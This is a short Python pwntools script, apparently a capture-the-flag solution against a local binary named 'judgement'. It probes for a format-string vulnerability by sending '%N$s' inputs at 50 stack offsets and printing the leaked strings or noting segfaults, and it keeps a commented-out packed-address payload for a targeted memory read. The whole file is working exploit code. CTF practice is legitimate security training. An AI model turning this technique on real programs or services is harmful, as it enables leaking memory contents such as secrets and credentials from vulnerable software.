#!/usr/bin/env python

import struct
from pwn import *

context.log_level= 'warn'



for i in range(50):
	p = tubes.process.process([],executable="./judgement-4da7533784aa31b96ca158fbda9677ee8507781ead6625dc6d577fd5d2ff697c", shell=True)
	p.recv()
	p.sendline('%' + str(i) + "$s")
	try:
		print i, p.recv().split('\n')[0]
	except EOFError:
		print "segfault at", i

	p.close()



# ad = struct.pack("<I", 0x804a0a0)

# print(ad + "$28%s")